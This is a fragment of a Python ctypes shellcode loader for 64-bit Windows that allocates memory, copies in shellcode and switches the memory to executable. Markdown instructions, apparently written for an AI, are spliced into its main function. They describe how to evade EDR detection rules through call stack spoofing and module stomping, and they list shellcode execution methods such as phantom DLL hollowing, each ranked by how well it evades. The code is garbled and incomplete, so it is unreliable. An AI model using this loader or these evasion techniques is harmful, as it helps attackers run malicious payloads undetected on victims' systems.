from ctypes import wintypes

# Define necessary Windows types for 64-bit compatibility
# This ensures pointers and sizes are handled correctly.
wintypes.LPVOID = ctypes.c_void_p
wintypes.HANDLE = ctypes.c_void_p
wintypes.DWORD = ctypes.c_ulong
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.BOOL = ctypes.c_int
wintypes.SIZE_T = ctypes.c_size_t

# Define constants for memory allocation and protection
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

# Get a handle to kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define the function prototypes for the Windows APIs we will use.
# This is CRITICAL for 64-bit execution to prevent pointer truncation.

# VirtualAlloc
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAlloc.restype = wintypes.LPVOID

# VirtualProtect
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

# VirtualFree
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
VirtualFree = kernel32.VirtualFree
VirtualFree.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD]
VirtualFree.restype = wintypes.BOOL

def main():
    """
    Reads shellcode, allocates RW memory, copies shellcode,
    changes memory protection to RX, and executes it.
    """
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} <path_to_shellcode_bin>")
        sys.exit(1)

    try:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found at '{{shellcode_path}}'")

    except Exception as e:
        print(f"An error occurred while reading the file: {{e}}")

    ## Exclusion Strategy Constraints
    When analyzing Known_Exclusions, adhere to these rules:
    - **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
    - **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
    - **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.

    ## Example of Analysis Logic
    When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:

    - **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.

    - **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
      - `c:\\windows\\assembly\\nativeimages_*.dll`
      - `c:\\program files\\*`
      The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.

    ## Standard Testing Methodologies
    - **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
    
    ## Language Specific Constraints
    - Ensure 64-bit compatibility. The shellcode is x64. When using ctypes on 64-bit Windows, you MUST explicitly define `.argtypes` and `.restype` (e.g., `ctypes.wintypes.HMODULE`, `ctypes.c_void_p`) for all Windows APIs to prevent 64-bit pointers from being truncated to 32-bit integers.
    - Always cast memory addresses to `ctypes.c_void_p()` before passing them to Windows APIs like `VirtualProtect` to avoid pointer truncation.
    - Do not print raw bytes or parsed memory strings (like PE section names) to the console to avoid UnicodeEncodeError on Windows.
